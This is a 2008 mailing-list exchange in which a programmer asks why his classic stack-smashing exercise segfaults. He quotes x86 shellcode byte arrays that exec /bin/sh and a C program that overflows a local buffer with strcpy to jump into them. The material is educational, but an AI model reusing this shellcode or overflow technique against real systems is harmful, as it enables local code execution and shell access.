From: Varun Chandramohan <varunc@linux.vnet.ibm.com>
Subject: Re: buffer overflow
Date: Tue, 11 Mar 2008 16:11:20 +0530
Message-ID: <47D661D0.90905@linux.vnet.ibm.com>
References: <47D621E6.1090403@linux.vnet.ibm.com> <1205229858.4033.12.camel@debian.nordiclan.net>
Mime-Version: 1.0
Content-Transfer-Encoding: QUOTED-PRINTABLE
Return-path: <linux-c-programming-owner@vger.kernel.org>
In-Reply-To: <1205229858.4033.12.camel@debian.nordiclan.net>
Sender: linux-c-programming-owner@vger.kernel.org
List-ID: <linux-c-programming.vger.kernel.org>
Content-Type: text/plain; charset="iso-8859-1"
To: RTL <rtl@codehack.se>
Cc: linux-c-programming@vger.kernel.org

Patrik B=E5t wrote:
> tis 2008-03-11 klockan 11:38 +0530 skrev Varun Chandramohan:
>  =20
>> Hi all,
>>
>>              Can someone tell me whats is wrong with this program? A=
ll i
>> get is seg fault. Iam trying to create a stack overflow and exec a
>> shell. Somehow its not working. The system is x86 on linux.
>> gcc (GCC) 4.1.1 20070105 (Red Hat 4.1.1-52)
>> Copyright (C) 2006 Free Software Foundation, Inc.
>> This is free software; see the source for copying conditions.  There=
 is NO
>> warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR P=
URPOSE.
>>
>>
>>
>> The Code:
>> #include <stdio.h>
>> #include <string.h>
>>
>> char shellcode[] =3D
>>         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb=
0\x0b"
>>         "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x4=
0\xcd"
>>         "\x80\xe8\xdc\xff\xff\xff/bin/sh";
>> #if 0
>> char shellcode[] =3D
>>         "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x0=
0\x00"
>>         "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xc=
d\x80"
>>         "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xf=
f\xff"
>>         "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
>>
>> #endif
>>
>> char large_string[128];
>> int main() {
>>   char buffer[96];
>>   int i;
>>   long *long_ptr =3D (long *) large_string;
>>   memset(&buffer,0,sizeof(buffer));
>>
>>   for (i =3D 0; i < 32; i++)
>>     *(long_ptr + i) =3D  (long)&buffer;
>>
>>   for (i =3D 0; i < strlen(shellcode); i++)
>>     large_string[i] =3D shellcode[i];
>>
>>   strcpy(buffer,large_string);
>>    =20
> strcpy(large_string,buffer);
>
> //This is working tho...
>  =20
Thanks for the reply, but this doesnt spawn a shell, does it? This
simply avoids the sigsegv
>> }
>>
>> --
>> To unsubscribe from this list: send the line "unsubscribe linux-c-pr=
ogramming" in
>> the body of a message to majordomo@vger.kernel.org
>> More majordomo info at  http://vger.kernel.org/majordomo-info.html
>>    =20
>
> --
> To unsubscribe from this list: send the line "unsubscribe linux-c-pro=
gramming" in
> the body of a message to majordomo@vger.kernel.org
> More majordomo info at  http://vger.kernel.org/majordomo-info.html
>  =20

--
To unsubscribe from this list: send the line "unsubscribe linux-c-progr=
amming" in
the body of a message to majordomo@vger.kernel.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
